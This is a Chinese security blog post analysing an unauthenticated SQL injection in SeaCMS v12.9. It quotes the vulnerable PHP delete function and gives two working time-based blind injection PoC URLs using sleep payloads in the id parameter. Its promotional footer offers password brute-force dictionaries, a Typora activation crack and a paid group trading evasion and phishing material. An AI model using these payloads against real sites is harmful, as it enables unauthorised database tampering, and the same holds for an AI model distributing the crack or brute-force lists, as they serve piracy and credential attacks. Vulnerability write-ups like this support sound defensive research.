#  漏洞分析 | SeaCMS v12.9 中 SQL 注入   
Hebing123  不秃头的安全   2024-03-27 07:26  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVNCXqrL9k0r2icauIbCEBEls8X0kfM78frUZBL3ZSZKZlICQlev704WAdTLlWPZ0taFhvEm1mr3Lg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**SeaCMS v12.9 中 SQL 注入**  
  
  
  
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请联系。  
  
还在学怎么挖通用漏洞和src吗？快来加入星球~私聊有优惠，满100人涨价~  
  
由  
于微信公众号推送机制改变了，快来  
星标不再迷路，谢谢大家！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fXy8gHzKiaBoATGQ8tpR3ahROtv4Aby7ehiafuS9DyQ6ESNKa1IP4YJpcEbDB3BrHMAQdHYwONFURWQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**漏洞详情**  
  
****  
SeaCMS v12.9版本中的dmku/index.php文件存在未经身份验证的SQL注入漏洞，用户提供的数据直接用于SQL查询而没有经过适当的恶意编码过滤处理。  
  
****  
****  
**源代码获取处**  
```
https://github.com/seacms-net/CMS
```  
  
  
****  
**漏洞代码存在位置**  
```
https://github.com/HuaQiPro/seacms/blob/ffa00178c7bf966b6bed7109ca76c270eadfeb70/js/player/dmplayer/dmku/class/mysqli.class.php#L287-L305
```  
  
********  
**漏洞分析**  
```
第287-305行
public static function 删除_弹幕数据($id)
{
        try {
            global $_config;
            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
            $conn->set_charset('utf8');
            if ($_GET['type'] == "list") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $result = "DELETE FROM sea_danmaku_list WHERE cid={$id}";
                $conn->query($sql);
                $conn->query($result);
            } else if ($_GET['type'] == "report") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $conn->query($sql);
            }
        } catch (PDOException $e) {
            showmessage(-1, '数据库错误:' . $e->getMessage());
        }
    }
```  
  
上面看出，  
它直接被拼接到SQL语句中而没有进行过滤。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fUicTdia94uInTxVfqIjic7h2AMbZXaaMILTHicP5aJBRiaszzVbExS2dAavO2jb2bX5oiaibLczNkDicsr2A/640?wx_fmt=png&from=appmsg "")  
  
  
### PoC  
  
```
http(s)://x.x.x.x:port//js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(10)))v)&type=list
```  
  
```
http(s)://x.x.x.x:port//js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(15)))v)&type=list
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fUicTdia94uInTxVfqIjic7h2ADwBD15frzp6j1NxfrHLibE65PzP62IpoAhC9f5wY8Z6JNsf71jiay5Pw/640?wx_fmt=png&from=appmsg "")  
  
  
  
该漏洞允许未经身份验证的远程攻击者通过id参数注入任意SQL命令，可完成延时注入等操作。  
  
  
‍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjIKcQsgZ0q8U9MOMKkIGEGjAcDMjOXuW6eYDOur79SYFak4z5Pu5v6liaPDvuaAVGKSibvBnKiaRFiaHvBDYwsfAQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**关于我们:**  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持。  
  
  
  
  
**关注福利：**  
  
  
回复“  
google工具" 获取 google语法生成工具  
  
回复“  
小程序渗透工具" 获取 小程序渗透工具  
  
回复“  
暴力破解字典" 获取 各种常用密码字典打包  
  
回复“  
typora激活  
" 获取 最新typora激活程序  
  
回复“  
蓝队工具箱  
”即可获取一款专业级应急响应的集成多种工具的工具集  
  
  
  
**知识星球**  
  
  
星球里有什么？  
  
CNVD、EDU及SRC赏金，攻防演练资源分享(免杀，溯源，钓鱼等)，各种新鲜好用工具，最新poc定期更新，  
以及一些好东西（  
还在学怎么挖通用漏洞吗快来加入），16个专栏会持续更新~  
  
**90/100,涨价前的最后一波限时优惠立减，提前续费有优惠，好用不贵很实惠**  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fXVKN0UZ9GGvrqc4QDXM9Y4ehNibsFszRwUyiapOufVcjq26HQuvKjlyVQYZnPK6dET2DWaFBebibPCw/640?wx_fmt=jpeg&from=appmsg "")  
  
**交流群**  
  
回复"加群"或加我联系方式拉，下面有二维码，技术交流群~  
  
****  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjIKcQsgZ0q8U9MOMKkIGEGjAcDMjOXuW6eYDOur79SYFak4z5Pu5v6liaPDvuaAVGKSibvBnKiaRFiaHvBDYwsfAQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**安全考证**  
  
需要考以下各类安全证书的可以联系我，  
绝对低价绝对优惠、组团更便宜，报名成功先送星球一年，CISP、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP......  
巨优惠：[](http://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247485089&idx=1&sn=1ce62bfa8fd07d8de5d1c9eb33568b0b&chksm=cf1aa4f3f86d2de5a7ad4a33c66b106b6878233bdfee5fc91a245a24b6d1168ed2fde093136f&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247485089&idx=1&sn=1ce62bfa8fd07d8de5d1c9eb33568b0b&chksm=cf1aa4f3f86d2de5a7ad4a33c66b106b6878233bdfee5fc91a245a24b6d1168ed2fde093136f&scene=21#wechat_redirect)  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVicVKjibDEuQ9Kib0ia6TibrVmoFRWyXqReDwUhDas8kOqD29OfTA4XzqZjgw1pn8OYibtFfQxvPJq4kNg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
